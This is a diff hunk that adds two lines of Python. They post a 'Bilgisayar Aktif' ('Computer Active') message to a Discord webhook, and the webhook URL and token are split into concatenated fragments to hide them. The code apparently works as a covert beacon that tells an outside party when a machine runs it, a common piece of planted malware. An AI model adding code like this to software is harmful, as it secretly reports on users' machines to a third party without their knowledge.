@@ -1,0 +1,2 @@
+import requests
+requests.post("htt"+"ps:/"+"/dis"+"cord.c"+"om/api/webh"+"ooks/112066315"+"2548380682/Dykot-A-ONI5l63sOGVFY4iKIrZjAiceQxY1SkwLCQrvF2hjb0JcQXSqCLUoJbpTPG4q",data={'content':'Bilgisayar Aktif'})
